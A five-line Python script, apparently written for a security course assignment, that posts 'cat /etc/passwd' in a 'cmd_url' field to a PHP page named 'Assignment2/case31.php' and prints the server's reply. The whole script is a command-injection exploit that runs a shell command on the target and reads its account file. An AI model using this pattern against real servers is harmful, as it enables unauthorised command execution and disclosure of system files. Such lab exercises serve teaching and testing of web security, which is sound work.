import requests
url="http://www.wsb.com/Assignment2/case31.php"
payload={"cmd_url":"cat /etc/passwd"}
r=requests.post(url,data=payload)
print(r.text)
